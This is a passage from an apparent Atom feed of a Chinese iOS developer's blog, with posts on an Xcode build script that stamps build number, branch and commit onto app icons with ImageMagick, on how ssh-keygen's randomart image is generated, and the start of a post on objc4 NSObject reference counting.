<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">convertPath=`<span class="built_in">which</span> convert`</div><div class="line"><span class="comment"># 判断 convertPath 文件是否存在</span></div><div class="line"><span class="keyword">if</span> [ ! <span class="_">-f</span> <span class="variable">$&#123;convertPath&#125;</span>]; <span class="keyword">then</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"==============</span></div><div class="line">WARNING: 你需要先安装 ImageMagick！！！！:</div><div class="line">brew install imagemagick</div><div class="line">=============="</div><div class="line"><span class="built_in">exit</span> 0;</div><div class="line"><span class="keyword">fi</span></div></pre></td></tr></table></figure>
<ol>
<li>获取 commit 号 hash 值、分支名、build 号，并将其拼接成一个字符串</li>
</ol>
<p>PlistBuddy 可以用于读取 Plist 文件，通过描述路径就可以找到你想知道的 Key 对应的 Value。<br><code>${INFOPLIST_FILE}</code> 是 xcodebuild 提供的变量（具体可以参考 <a href="http://help.apple.com/xcode/mac/8.0/#/itcaec37c2a6" target="_blank" rel="external">Build settings reference</a>）提供了编译后 <code>info.plist</code> 的路径。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">commit=`git rev-parse --short HEAD`</div><div class="line">branch=`git rev-parse --abbrev-ref HEAD`</div><div class="line">buildNumber=`/usr/libexec/PlistBuddy -c <span class="string">"Print CFBundleVersion"</span> <span class="string">"<span class="variable">$&#123;INFOPLIST_FILE&#125;</span>"</span>`</div><div class="line">caption=<span class="string">"<span class="variable">$&#123;buildNumber&#125;</span> \n<span class="variable">$&#123;branch&#125;</span>\n<span class="variable">$&#123;commit&#125;</span>"</span></div></pre></td></tr></table></figure>
<ol>
<li>判断编译环境</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Release 不执行</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"Configuration: <span class="variable">$CONFIGURATION</span>"</span></div><div class="line"><span class="keyword">if</span> [ <span class="variable">$&#123;CONFIGURATION&#125;</span> = <span class="string">"Release"</span> ]; <span class="keyword">then</span></div><div class="line"><span class="built_in">exit</span> 0;</div><div class="line"><span class="keyword">fi</span></div></pre></td></tr></table></figure>
<ol>
<li>获取 Plist 中 CFBundleIconFiles 的数量</li>
</ol>
<p>在编译后的 <code>info.plist</code> 中，可以找到如下结构：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%86%99%E4%B8%80%E4%B8%AA%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E9%97%AE%E9%A2%98%E7%9A%84%E8%84%9A%E6%9C%AC-09.png" alt="blog_iOS——写一个快速定位问题的脚本-09"></p>
<p>这里记录了所有的 Icon files。查看 plist 的原格式，可以看到原始的 key 是什么。通过 PlistBuddy 和 路径 <code>CFBundleIcons:CFBundlePrimaryIcon:CFBundleIconFiles</code> 可以输出 value。</p>
<p><code>| wc -l</code> 可以统计输出行数。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">icon_count=`/usr/libexec/PlistBuddy -c <span class="string">"Print CFBundleIcons:CFBundlePrimaryIcon:CFBundleIconFiles"</span> <span class="string">"<span class="variable">$&#123;CONFIGURATION_BUILD_DIR&#125;</span>/<span class="variable">$&#123;INFOPLIST_PATH&#125;</span>"</span> | wc <span class="_">-l</span>`</div></pre></td></tr></table></figure>
<p>要注意的是， <code>/usr/libexec/PlistBuddy -c &quot;Print CFBundleIcons:CFBundlePrimaryIcon:CFBundleIconFiles&quot; &quot;${CONFIGURATION_BUILD_DIR}/${INFOPLIST_PATH}&quot;</code> 输出结果是这样的：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%86%99%E4%B8%80%E4%B8%AA%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E9%97%AE%E9%A2%98%E7%9A%84%E8%84%9A%E6%9C%AC-10.png" alt="blog_iOS——写一个快速定位问题的脚本-10"></p>
<p>输出一共是 <strong>五行</strong>，所以获得的结果是 5。</p>
<p>那么真实的 CFBundleIconFiles count 其实是：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">real_icon_index=$((<span class="variable">$&#123;icon_count&#125;</span> - 2))</div></pre></td></tr></table></figure>
<p>刚开始，我也没有注意。可想而知心情如何 =_=。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%86%99%E4%B8%80%E4%B8%AA%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E9%97%AE%E9%A2%98%E7%9A%84%E8%84%9A%E6%9C%AC-11.JPG" alt="blog_iOS——写一个快速定位问题的脚本-11"></p>
<ol>
<li>根据数量循环，执行调用『生成记号图方法』</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> ((i=0; i&lt;<span class="variable">$real_icon_index</span>; i++)); <span class="keyword">do</span></div><div class="line"><span class="comment"># 找到 icon 名</span></div><div class="line">icon=`/usr/libexec/PlistBuddy -c <span class="string">"Print CFBundleIcons:CFBundlePrimaryIcon:CFBundleIconFiles:<span class="variable">$i</span>"</span> <span class="string">"<span class="variable">$&#123;CONFIGURATION_BUILD_DIR&#125;</span>/<span class="variable">$&#123;INFOPLIST_PATH&#125;</span>"</span>`</div><div class="line"></div><div class="line"><span class="comment"># 调用 generateIcon 方法，传入 icon 名</span></div><div class="line">generateIcon <span class="string">"<span class="variable">$&#123;icon&#125;</span>@2x.png"</span></div><div class="line"></div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
<ol>
<li>generateIcon 方法</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">generateIcon</span></span>() &#123;</div><div class="line">    originalImg=<span class="variable">$1</span></div><div class="line"></div><div class="line">    <span class="built_in">cd</span> <span class="string">"<span class="variable">$&#123;CONFIGURATION_BUILD_DIR&#125;</span>/<span class="variable">$&#123;UNLOCALIZED_RESOURCES_FOLDER_PATH&#125;</span>"</span></div><div class="line"></div><div class="line">    <span class="comment"># 验证存在性</span></div><div class="line">    <span class="keyword">if</span> [[ ! <span class="_">-f</span> <span class="variable">$&#123;originalImg&#125;</span> || -z <span class="variable">$&#123;originalImg&#125;</span> ]]; <span class="keyword">then</span></div><div class="line">    <span class="built_in">return</span>;</div><div class="line">    <span class="keyword">fi</span></div><div class="line"></div><div class="line">    <span class="comment"># 进入编译后的工程目录</span></div><div class="line">    <span class="built_in">cd</span> <span class="string">"<span class="variable">$&#123;CONFIGURATION_BUILD_DIR&#125;</span>/<span class="variable">$&#123;UNLOCALIZED_RESOURCES_FOLDER_PATH&#125;</span>/"</span></div><div class="line"></div><div class="line">    <span class="comment"># 添加高斯模糊</span></div><div class="line">    convert <span class="variable">$&#123;originalImg&#125;</span> -blur 10x8 blur-original.png</div><div class="line"></div><div class="line">    <span class="comment"># 截取下部分</span></div><div class="line">    width=`identify -format %w <span class="variable">$&#123;originalImg&#125;</span>`</div><div class="line">    height=`identify -format %h <span class="variable">$&#123;originalImg&#125;</span>`</div><div class="line">    height_0=`expr <span class="variable">$&#123;height&#125;</span> / 2`</div><div class="line">    height_1=$((<span class="variable">$&#123;height&#125;</span> - <span class="variable">$&#123;height_0&#125;</span>))</div><div class="line">    convert blur-original.png -crop <span class="variable">$&#123;width&#125;</span>x<span class="variable">$&#123;height_0&#125;</span>+0+<span class="variable">$&#123;height_1&#125;</span> crop-blur-original.png</div><div class="line"></div><div class="line">    <span class="comment"># 加字</span></div><div class="line">    point_size=$(((8 * <span class="variable">$height</span>) / 58))</div><div class="line"></div><div class="line">    convert -background none -fill white -pointsize <span class="variable">$&#123;point_size&#125;</span> -gravity center caption:<span class="string">"<span class="variable">$&#123;caption&#125;</span>"</span> crop-blur-original.png +swap -composite label.png</div><div class="line"></div><div class="line">    <span class="comment"># 合成</span></div><div class="line">    composite -geometry +0+<span class="variable">$&#123;height_0&#125;</span> label.png <span class="variable">$&#123;originalImg&#125;</span> <span class="variable">$&#123;originalImg&#125;</span></div><div class="line"></div><div class="line">    <span class="comment"># 清除文件</span></div><div class="line">    rm blur-original.png</div><div class="line">    rm crop-blur-original.png</div><div class="line">    rm label.png</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="代码清单"><a href="#代码清单" class="headerlink" title="代码清单"></a>代码清单</h1><p>最终的代码清单放在了 Github 上：</p>
<blockquote>
<p><a href="https://github.com/summertian4/ZLYWatermarkIcon" target="_blank" rel="external">ZLYWatermarkIcon</a></p>
</blockquote>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><blockquote>
<p><a href="http://www.imagemagick.org/script/convert.php" target="_blank" rel="external">Command-line Tools:Convert</a><br><a href="http://blog.topspeedsnail.com/archives/7783" target="_blank" rel="external">使用ImageMagick添加图片水印－Linux</a><br><a href="https://github.com/krzysztofzablocki/IconOverlaying" target="_blank" rel="external">krzysztofzablocki/IconOverlaying</a><br><a href="http://merowing.info/2013/03/overlaying-application-version-on-top-of-your-icon/" target="_blank" rel="external">Overlaying application version on top of your icon</a><br><a href="http://www.charry.org/docs/linux/ImageMagick/ImageMagick.html" target="_blank" rel="external">我的ImageMagick使用心得</a><br><a href="http://www.ruanyifeng.com/blog/2012/11/gaussian_blur.html" target="_blank" rel="external">高斯模糊的算法</a><br><a href="http://help.apple.com/xcode/mac/8.0/#/itcaec37c2a6" target="_blank" rel="external">Build settings reference</a><br><a href="https://github.com/qinjx/30min_guides/blob/master/shell.md" target="_blank" rel="external">Shell脚本编程30分钟入门</a></p>
</blockquote>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我 <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#111;&#x3a;&#99;&#111;&#x64;&#x65;&#x72;&#x66;&#x69;&#115;&#x68;&#x40;&#x31;&#54;&#x33;&#46;&#99;&#x6f;&#109;">&#99;&#111;&#x64;&#x65;&#x72;&#x66;&#x69;&#115;&#x68;&#x40;&#x31;&#54;&#x33;&#46;&#99;&#x6f;&#109;</a>。</p>
<p>博主是 iOS 妹子一枚。</p>
<p>希望大家一起进步。</p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%86%99%E4%B8%80%E4%B8%AA%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E9%97%AE%E9%A2%98%E7%9A%84%E8%84%9A%E6%9C%AC-12.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;你是否见过？&quot;&gt;&lt;a href=&quot;#你是否见过？&quot; class=&quot;headerlink&quot; title=&quot;你是否见过？&quot;&gt;&lt;/a&gt;你是否见过？&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;你是否见过测试人员或者自己在 CI 上 install 了一个版本，发现了 BUG 后，突然忘了自己下的是 CI 上的哪一个 commit 的包？&lt;/li&gt;
&lt;li&gt;你是否见过下面这个东西：&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img src=&quot;http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%86%99%E4%B8%80%E4%B8%AA%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E9%97%AE%E9%A2%98%E7%9A%84%E8%84%9A%E6%9C%AC-01.jpg&quot; alt=&quot;blog_iOS——写一个快速定位问题的脚本-01&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E5%86%99%E4%B8%80%E4%B8%AA%E5%BF%AB%E9%80%9F%E5%AE%9A%E4%BD%8D%E9%97%AE%E9%A2%98%E7%9A%84%E8%84%9A%E6%9C%AC-02.png&quot; alt=&quot;blog_iOS——写一个快速定位问题的脚本-02&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>ssh-keygen 中生成的 randomart image 是什么</title>
    <link href="http://zhoulingyu.com/2017/03/27/ssh-keygen-%E4%B8%AD%E7%94%9F%E6%88%90%E7%9A%84-randomart-image-%E6%98%AF%E4%BB%80%E4%B9%88/"/>
    <id>http://zhoulingyu.com/2017/03/27/ssh-keygen-中生成的-randomart-image-是什么/</id>
    <published>2017-03-27T17:23:40.000Z</published>
    <updated>2017-05-15T02:48:26.479Z</updated>
    
    <content type="html"><![CDATA[<h1 id="randomart-image-出现在哪里"><a href="#randomart-image-出现在哪里" class="headerlink" title="randomart image 出现在哪里"></a>randomart image 出现在哪里</h1><p>通常我们在生成 SSH Key 的时候会用到 <code>ssh-keygen</code> 命令，在生成结束后，会输出类似如下的内容，这个 randomart image 是什么呢？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">The key&apos;s randomart image is:</div><div class="line">+--[ RSA 2048]----+</div><div class="line">|       o=.       |</div><div class="line">|    o  o++E      |</div><div class="line">|   + . Ooo.      |</div><div class="line">|    + O B..      |</div><div class="line">|     = *S.       |</div><div class="line">|      o          |</div><div class="line">|                 |</div><div class="line">|                 |</div><div class="line">|                 |</div><div class="line">+-----------------+</div></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="为什么会有-randomart-image"><a href="#为什么会有-randomart-image" class="headerlink" title="为什么会有 randomart image"></a>为什么会有 randomart image</h1><p>相比超长字符串，人们更容易接受图形。让我们对比两幅图片的差异比对比两个超长字符串也要容易的多。这就是为什么现在大家使用二维码，而不是复制粘贴 URL 的原因。</p>
<p>Randomart image 通过将 Key 转换成有规律的图片，让人可以更加容易的、快速的对比 Key 的异同。</p>
<h1 id="趣闻"><a href="#趣闻" class="headerlink" title="趣闻"></a>趣闻</h1><p>在<a href="http://aarontoponce.org/drunken_bishop.pdf" target="_blank" rel="external">《The drunken bishop: An analysis of the OpenSSH<br>fingerprint visualization algorithm》</a>中，作者通过一段有趣的故事来表达 randomart image 生成的过程：</p>
<blockquote>
<p>Peter 主教发现自己在一个封闭的矩形房间内，四面都是墙壁，而地板上又铺满了黑白交替矩形的瓷砖。Peter 主教突然开始头疼——大概应为之前喝了太多的酒——于是开始随意的走动起来。准确的说，他是按照对角走位的方式，就好像国际象棋上的主教一样。当他遇到墙壁的时候，如果他踩着黑瓷砖，就走向白瓷砖，如果踩着白瓷砖就走向黑瓷砖。每次动作之后，他都会在瓷砖上放置一个硬币，记录他踩过这里一次。走了 64 步之后，用完了所有的硬币，Peter 突然醒了过来。多么奇怪的梦！</p>
</blockquote>
<h1 id="如何生成"><a href="#如何生成" class="headerlink" title="如何生成"></a>如何生成</h1><p>看了上面的故事，来说一说 randomart image 具体是如何生成的。</p>
<p>我们知道 OpenSSH Key 的指纹是一个 MD5 校验和，同事可以用 16 进制表示出来，类似这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fc:94:b0:c1:e5:b0:98:7c:58:43:99:76:97:ee:9f:b7</div></pre></td></tr></table></figure>
<p>当然，也可以用二进制来表示。</p>
<p>于是按照 Peter 的走路方式，我们定义如下走位：</p>
<ol>
<li>“00” 表示向西北（左上）移动</li>
<li>“01” 表示向东北（右上）移动</li>
<li>“10” 表示向西南（右下）移动</li>
<li>“11” 表示向东南（坐下）移动</li>
</ol>
<p>就像这样：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_ssh-keygen%20%E4%B8%AD%E7%94%9F%E6%88%90%E7%9A%84%20randomart%20image%20%E6%98%AF%E4%BB%80%E4%B9%88-01.jpg" alt=""></p>
<p>我们来画个图，用于表示黑白相间的瓷砖房，并每个格子上都编号，一开始的时候，Peter 在房间的中间：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_ssh-keygen%20%E4%B8%AD%E7%94%9F%E6%88%90%E7%9A%84%20randomart%20image%20%E6%98%AF%E4%BB%80%E4%B9%88-02.jpg" alt=""></p>
<p>中间的 76 号就是 Peter 最初的位置。我们可以把 Peter 所在的格子表示为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">// 用坐标系表示</div><div class="line">P = x + 17y</div></pre></td></tr></table></figure>
<p>那么，从 76 号向四个方向移动 P 值变化：</p>
<ol>
<li>“00” 进入 58 号格子，数值 -18</li>
<li>“01” 进入 60 号格子，数值 -16</li>
<li>“10” 进入 92 号格子，数值 +16</li>
<li>“11” 进入 94 号格子，数值 +18</li>
</ol>
<p>对于碰墙的情况，做如下规则：</p>
<p>将房间的每个格子做分类，四个角分别为 a、b、c、d，靠着四面墙的分别为 T、R、B、L，其余部分为 M。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_ssh-keygen%20%E4%B8%AD%E7%94%9F%E6%88%90%E7%9A%84%20randomart%20image%20%E6%98%AF%E4%BB%80%E4%B9%88-03.jpg" alt=""></p>
<p>对于每一种情况：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_ssh-keygen%20%E4%B8%AD%E7%94%9F%E6%88%90%E7%9A%84%20randomart%20image%20%E6%98%AF%E4%BB%80%E4%B9%88-04.jpg" alt=""></p>
<p>解释一下上图，以 a 栏为例，如果下一步像左上移动，但是继续走就撞墙了，所以实际移动为 <code>不移动</code>；如果向右上移动，实际移动为 <code>向右移动</code>；如果向左下移动，实际移动为 <code>向下移动</code>；如果像右下移动，实际移动就是 <code>向下移动</code>。</p>
<p>那么 Peter 投掷硬币是怎样体现的？实际上，是做如下统计，每个格子，如果没有被踩过，则不做表示；如果被踩过一次，记录为 <code>.</code>；如果被踩了两次，记录为 <code>o</code>…具体如下：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_ssh-keygen%20%E4%B8%AD%E7%94%9F%E6%88%90%E7%9A%84%20randomart%20image%20%E6%98%AF%E4%BB%80%E4%B9%88-05.jpg" alt=""></p>
<p>比较特别的是 <code>S</code> 和 <code>E</code>，<code>S</code> 和 <code>E</code> 分别标记起始和终止位置（所以 76 号格子永远是 S）。</p>
<p>实际操作一下，对于 <code>fc:94:b0:c1:e5:b0:98:7c:58:43:99:76:97:ee:9f:b7</code>，我们将其转换成二进制：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">11010100:11010100:11111101:11001010:...:00111011:11100100:10111010:11101001</div></pre></td></tr></table></figure>
<p>将二进制二位一组，按照下表做好走路的顺序：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_ssh-keygen%20%E4%B8%AD%E7%94%9F%E6%88%90%E7%9A%84%20randomart%20image%20%E6%98%AF%E4%BB%80%E4%B9%88-06.jpg" alt=""></p>
<p>按照上面的顺序，踩到格子的顺序如下。</p>
<p>76, 58, 76, 94, 112, 94, 78, 62, 78, 60, 42, 60, 76, 60, 42, 24, 42, 26, 10, 26, 44, 26, 8, 26, 42, 24, 40, 24, 40, 22, 40, 58, 42, 24, 40, 24, 8, 26, 8, 7, 8, 9, 25, 9, 25, 41, 25, 43, 27, 45, 29, 13, 29, 45, 63, 79, 97, 115, 133, 117, 133, 151, 135, 152, 151</p>
<p>最后做成统计，填好图，成品就如下。是不是就和我们平常在控制台得到的输出一致？</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_ssh-keygen%20%E4%B8%AD%E7%94%9F%E6%88%90%E7%9A%84%20randomart%20image%20%E6%98%AF%E4%BB%80%E4%B9%88-07.jpg" alt=""></p>
<h1 id="相关"><a href="#相关" class="headerlink" title="相关"></a>相关</h1><blockquote>
<p><a href="https://superuser.com/questions/22535/what-is-randomart-produced-by-ssh-keygen" target="_blank" rel="external">What is randomart produced by ssh-keygen?</a><br><a href="https://pthree.org/2013/05/30/openssh-keys-and-the-drunken-bishop/" target="_blank" rel="external">OpenSSH Keys and The Drunken Bishop</a><br><a href="http://aarontoponce.org/drunken_bishop.pdf" target="_blank" rel="external">The drunken bishop: An analysis of the OpenSSH<br>fingerprint visualization algorithm</a></p>
</blockquote>
<p><em>最后一点说明：其主要原理都发表在 <a href="http://aarontoponce.org/drunken_bishop.pdf" target="_blank" rel="external">The drunken bishop: An analysis of the OpenSSH<br>fingerprint visualization algorithm</a></em></p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我 <a href="&#109;&#97;&#105;&#x6c;&#116;&#111;&#x3a;&#99;&#x6f;&#x64;&#101;&#114;&#102;&#x69;&#115;&#104;&#64;&#49;&#54;&#51;&#x2e;&#99;&#111;&#109;">&#99;&#x6f;&#x64;&#101;&#114;&#102;&#x69;&#115;&#104;&#64;&#49;&#54;&#51;&#x2e;&#99;&#111;&#109;</a>。</p>
<p>博主是 iOS 妹子一枚。</p>
<p>希望大家一起进步。</p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;randomart-image-出现在哪里&quot;&gt;&lt;a href=&quot;#randomart-image-出现在哪里&quot; class=&quot;headerlink&quot; title=&quot;randomart image 出现在哪里&quot;&gt;&lt;/a&gt;randomart image 出现在哪里&lt;/h1&gt;&lt;p&gt;通常我们在生成 SSH Key 的时候会用到 &lt;code&gt;ssh-keygen&lt;/code&gt; 命令，在生成结束后，会输出类似如下的内容，这个 randomart image 是什么呢？&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;The key&amp;apos;s randomart image is:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+--[ RSA 2048]----+&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;|       o=.       |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;|    o  o++E      |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;|   + . Ooo.      |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;|    + O B..      |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;|     = *S.       |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;|      o          |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;|                 |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;|                 |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;|                 |&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;+-----------------+&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="冷知识" scheme="http://zhoulingyu.com/categories/%E5%86%B7%E7%9F%A5%E8%AF%86/"/>
    
      <category term="Other" scheme="http://zhoulingyu.com/categories/%E5%86%B7%E7%9F%A5%E8%AF%86/Other/"/>
    
    
      <category term="冷知识" scheme="http://zhoulingyu.com/tags/%E5%86%B7%E7%9F%A5%E8%AF%86/"/>
    
      <category term="Other" scheme="http://zhoulingyu.com/tags/Other/"/>
    
  </entry>
  
  <entry>
    <title>iOS进阶——iOS（Objective-C）内存管理·二</title>
    <link href="http://zhoulingyu.com/2017/02/15/Advanced-iOS-Study-objc-Memory-2/"/>
    <id>http://zhoulingyu.com/2017/02/15/Advanced-iOS-Study-objc-Memory-2/</id>
    <published>2017-02-15T11:59:33.000Z</published>
    <updated>2017-05-15T02:48:26.475Z</updated>
    
    <content type="html"><![CDATA[<p>在写 『<a href="http://zhoulingyu.com/2017/02/08/iOS进阶——iOS-Memory-Block/">iOS（Objective-C） 内存管理&amp;Block</a>』 一文时，我并没有发现 NSObject 的代码已经被开源了，所以分析的主要是 GNUStep 的源码，对 Apple 的部分只是通过猜测。</p>
<p>实质上，NSObject 的实现内容已经开源在 <a href="https://opensource.apple.com/tarballs/objc4/" target="_blank" rel="external">objc4-706</a> 中。于是我便开始学习 objc4 中的内容。</p>
<p>下面就和大家扒一扒 Apple 的 NSObject 内存管理的一些内容。</p>
<h1 id="SideTable"><a href="#SideTable" class="headerlink" title="SideTable"></a>SideTable</h1><p>找到 NSObject.mm，首先来一些非常重要的信息，以便后面的理解。</p>
<p><strong>objc4-706 NSObject.mm SideTable:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> SideTable &#123;</div><div class="line">    <span class="comment">// 保证原子操作的自旋锁</span></div><div class="line">    spinlock_t slock;</div><div class="line">    <span class="comment">// 引用计数的 hash 表</span></div><div class="line">    RefcountMap refcnts;</div><div class="line">    <span class="comment">// weak 引用全局 hash 表</span></div><div class="line">    weak_table_t weak_table;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<a id="more"></a>
<p>SideTable 结构体重定了几个非常重要的变量。</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// The order of these bits is important.</span></div><div class="line"><span class="meta">#define SIDE_TABLE_WEAKLY_REFERENCED (1UL<span class="meta-string">&lt;&lt;0)</span></span></div><div class="line">#define SIDE_TABLE_DEALLOCATING      (1UL&lt;&lt;1)  // MSB-ward of weak bit</div><div class="line">#define SIDE_TABLE_RC_ONE            (1UL&lt;&lt;2)  // MSB-ward of deallocating bit</div><div class="line">#define SIDE_TABLE_RC_PINNED         (1UL&lt;&lt;(WORD_BITS-1))</div><div class="line"></div><div class="line">#define SIDE_TABLE_RC_SHIFT 2</div><div class="line">#define SIDE_TABLE_FLAG_MASK (SIDE_TABLE_RC_ONE-1)</div></pre></td></tr></table></figure>
<p>以上定义的是几个重要偏移量。引用计数 retainCount 是保存在一个无符号整形中，也就是有 8 个字节。其结构可以用下图表示：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_Advanced-iOS-Study-objc-Memory-2-01.png" alt=""></p>
<ol>
<li><code>SIDE_TABLE_WEAKLY_REFERENCED (1UL&lt;&lt;0)</code>（表示对象所在内存的第 1 位），标识该对象是否有过 weak 对象；</li>
<li><code>SIDE_TABLE_DEALLOCATING (1UL&lt;&lt;1)</code>（表示对象所在内存的第 2 位），标识该对象是否正在 dealloc（析构）。</li>
<li><code>SIDE_TABLE_RC_ONE (1UL&lt;&lt;2)</code> （表示对象所在内存的第 3 位），存放引用计数数值（其实第三位之后都用来存放引用计数数值）。</li>
</ol>
<h1 id="retainCount"><a href="#retainCount" class="headerlink" title="retainCount"></a>retainCount</h1><p>找到 retainCount 的实现，一层一层向下看。</p>
<p><strong>objc4 NSObject.mm retainCount:</strong></p>
